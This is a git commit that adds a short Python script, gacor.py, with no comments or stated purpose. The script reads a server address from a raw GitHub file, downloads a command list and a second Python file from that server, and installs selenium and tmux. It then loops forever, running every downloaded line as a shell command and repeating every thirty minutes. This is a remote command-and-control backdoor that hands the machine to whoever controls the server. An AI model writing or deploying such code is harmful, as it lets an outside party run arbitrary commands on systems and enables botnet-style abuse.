3f0faa0f26019b5212b00a79a3b7258c683d1fde
petxir <108912427+petxir@users.noreply.github.com>
2025-03-29 14:10:14 +0700

    Create gacor.py

---
+++ gacor.py
@@ -0,0 +1,16 @@
+import time
+import requests
+import os
+url = "https://raw.githubusercontent.com/petxir/7641de1963f0c6a475f4e802cfcb870d/refs/heads/main/pepek.txt"
+dataurl = requests.get(url)
+os.system("wget -O l.txt "+dataurl.text+"/xyz/web/action.php?command=1")
+os.system("wget "+dataurl.text+"/xyz/xyz.py")
+os.system("pip install selenium")
+os.system("apt-get install tmux")
+while True:
+    with open("l.txt", "r", encoding="utf-8") as file:
+        for line in file:
+            os.system(line.strip())
+    time.sleep(1800)
+    os.system("tmux kill-server")
+    time.sleep(10)
